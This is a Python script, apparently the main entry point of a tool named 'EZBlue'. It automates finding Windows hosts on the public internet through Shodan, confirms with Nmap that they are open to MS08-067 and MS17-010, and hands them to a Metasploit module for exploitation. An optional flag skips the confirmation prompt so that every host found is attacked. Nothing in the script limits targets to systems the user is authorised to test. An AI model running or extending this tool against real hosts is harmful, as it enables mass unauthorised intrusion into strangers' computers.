import argparse
import glob
import os
import sys
import shodan_searcher
import vuln_checker
# import mss
import metasploit_handler
import json

# Currently lists hosts and asks for y/n confirmation.
# Goal would be line-item veto that allows list minute seleciton of which hosts to exploit.
def dict_confirm(vuln_dict):
    if vuln_dict['ms08-067']:
        print('Hosts vulnerable to MS08-067:\n')
        host_id = 0
        for ip in vuln_dict['ms08-067']:
            print('{0}: {1}'.format(host_id, ip))
    
    if vuln_dict['ms17-010-psexec'] or vuln_dict['ms17-010-eternalblue']:
        print('Hosts vulnerable to MS17-010:\n')
        host_id = 0
        for ip in vuln_dict['ms17-010-psexec']:
            print('{0}: {1}'.format(host_id, ip))
        for ip in vuln_dict['ms17-010-eternalblue']:
            print('{0}: {1}'.format(host_id, ip))
    
    response = input('\nDo you want to exploit all of the above hosts?(y/n)\n')
    
    result = False
    if 'yes'.startswith(response.lower()):
        result = True
    
    return result


parser = argparse.ArgumentParser(prog='EZBlue', description='Identify and exploit hosts that are vulnerable to ms08-067 or ms17-010.')
# Just do one phase.
parser.add_argument('--justshodan', '-js', metavar='outputFile', help='Just runs the Shodan searching phase, using any extra queries given, and produces a list of IP addresses which may be vulnerable. Takes in the filename where you want to store the resulting IP addresses. Not usable with --clean, or any other --just* or --no* flags.')
parser.add_argument('--justnmap', '-jn', nargs=2, metavar=('inputFile', 'outputFile'), help='Just runs the Nmap host vulnerability confirmation phase. First takes in the filename of the list of IP addresses and then the filename where you want to store the resulting JSON of vulnerable hosts. Not usable with --clean, --limit, any queries arguments, or any other --just* or --no* commands.')
parser.add_argument('--justexploit', '-jx', metavar='inputFile', help='Just does confirmation and then the exploitation phase. Takes in the filename of the JSON file of vulnerable hosts. Not usable with --clean, --limit, --append, any queries arguments, or any other --just* or --no* flags except for --noconfirmation.')
# Do all but one phase.
parser.add_argument('--noshodan', '-ns', metavar='inputFile', help='Skips the usage of Shodan and goes directly to vulnerability checking with Nmap. Takes in the filename of a list of IP addresses. Not usable with --clean, --limit, any queries arguments, or any other --just* or --no* flags except for --noconfirmation.')
parser.add_argument('--nonmap', '-nn', action='store_true', help='Uses Shodan to identify potentially vulnerable hosts with any extra queries given, then skips the Nmap vulnerability checking and goes straight to the host confirmation and then potential exploitation (attempting with both MS08-067 and MS17-010). Not usable with --clean, or any other --just* or --no* flags except for --noconfirmation.')
parser.add_argument('--noexploit', '-nx', metavar='outputFile', help='Only runs the tool through the Nmap vulnerability checking phases. Will leave intermediary files, which includes Shodan results and the JSON of vulnerable hosts, for later runs. Takes the filename that the JSON of targets should be written to. Not usable with --clean, or any other --just* or --no* flags.')
# Modifiers/Utilities
parser.add_argument('--clean', action='store_true', help='Removes all intermediary files from past runs. Cannot be run with any other flags or arguments.')
parser.add_argument('--noconfirmation', '-nc', action='store_true', help='Before entering the exploitation phase, skips host confirmation. Attempts to exploit every host in the target JSON.')
parser.add_argument('--append', '-a', action='store_true', help='As the tool runs, appends the results of each phase to the end of the intermediary files, rather than overwriting them.')
parser.add_argument('--limit', '-l', type=int, help='Set a limit on the number of Shodan results.')
parser.add_argument('queries', nargs='*', help='Additional search queries to use in the Shodan search phases.')

args = parser.parse_args()

# Check parameter compatibility
if args.justshodan and (args.justnmap or args.justexploit or args.noshodan or args.nonmap or args.noexploit or args.clean or args.noconfirmation):
    raise ValueError('--justshodan was used with one or more incompatible flags.')
elif args.justnmap and (args.justshodan or args.justexploit or args.noshodan or args.nonmap or args.noexploit or args.clean or args.noconfirmation or args.limit or args.queries):
    raise ValueError('--justnmap was used with one or more incompatible flags.')
elif args.justexploit and (args.justshodan or args.justnmap or args.noshodan or args.nonmap or args.noexploit or args.clean or args.limit or args.queries or args.append):
    raise ValueError('--justexploit was used with one or more incompatible flags.')
elif args.noshodan and (args.justshodan or args.justnmap or args.justexploit or args.nonmap or args.noexploit or args.clean or args.limit or args.queries or args.append):
    raise ValueError('--noshodan was used with one or more incompatible flags.')
elif args.nonmap and (args.justshodan or args.justnmap or args.justexploit or args.noshodan or args.noexploit or args.clean or args.append):
    raise ValueError('--nonmap was used with one or more incompatible flags.')
elif args.noexploit and (args.justshodan or args.justnmap or args.justexploit or args.noshodan or args.nonmap or args.clean or args.noconfirmation):
    raise ValueError('--noexploit was used with one or more incompatible flags.')
elif args.clean and (args.justshodan or args.justnmap or args.justexploit or args.noshodan or args.nonmap or args.noexploit or args.noconfirmation or args.limit or args.queries or args.append):
    raise ValueError('--clean was used with one or more incompatible flags.')

# Remove all the .out files. Kinda useless. Maybe add removal of __pycache__?
if args.clean:
    for f in glob.glob("*.out"):
        os.remove(f)

# Shodan search phase
if args.justshodan or args.nonmap or args.noexploit or (not args.justshodan and not args.justnmap and not args.justexploit and not args.noshodan and not args.nonmap and not args.noexploit and not args.clean):

    ip_list = shodan_searcher.query_shodan(query=' '.join(args.queries), limit=args.limit)

    if(args.justshodan):
        with open(args.justshodan, 'a' if args.append else 'w') as f:
            f.write('\n'.join(ip_list))
        exit()


# Nmap vulnerability checking phase
# vuln_dict = {'ms08-067': [], 'ms17-010-psexec': [], 'ms17-010-eternalblue': []}
vuln_dict = vuln_checker.check_vulnerable(ip=None)
if args.justnmap:
    vuln_dict = vuln_checker.check_vulnerable(ip_file=args.justnmap[0])
    prev = None

    # Load previous hosts, effectively a smart append
    if args.append and os.path.exists(args.justnmap[1]):
        with open(args.justnmap[1], 'r') as f:
            prev = json.load(f)

    if prev:
        for key in prev:
            vuln_dict[key] = vuln_dict.get(key, []) + prev[key]

    with open(args.justnmap[1], 'w') as out:
        json.dump(vuln_dict, out)

    exit()

elif args.noexploit:
    vuln_dict = vuln_checker.check_vulnerable(ip_list=ip_list)
    prev = None

    if args.append and os.path.exists(args.noexploit):
        with open(args.noexploit, 'r') as f:
            prev = json.load(f)

    if prev:
        for key in prev:
            vuln_dict[key] = vuln_dict.get(key, []) + prev[key]

    with open(args.noexploit, 'w') as out:
        json.dump(vuln_dict, out)

elif args.noshodan:
    vuln_dict = vuln_checker.check_vulnerable(ip_file=args.noshodan)

elif not args.justshodan and not args.justnmap and not args.justexploit and not args.noshodan and not args.nonmap and not args.noexploit and not args.clean:
    vuln_dict = vuln_checker.check_vulnerable(ip_list=ip_list)

# Pre-Exploitation
if args.justexploit:
    with open(args.justexploit, 'r') as f:
        vuln_dict = json.load(f)

# Exploitation phase
if args.justexploit or args.noshodan or args.nonmap or (not args.justshodan and not args.justnmap and not args.justexploit and not args.noshodan and not args.nonmap and not args.noexploit and not args.clean):
    if not vuln_dict['ms08-067'] and not vuln_dict['ms17-010-psexec'] and not vuln_dict['ms17-010-eternalblue']:
        print('No vulnerable hosts were found.')
        sys.exit()

    if not args.noconfirmation: # Runs confirmation
        if not dict_confirm(vuln_dict): # Make this functionality richer.
            sys.exit()

    print('Going nuclear!\n')
    metasploit_handler.handle_exploitation(exploit_dict=vuln_dict)
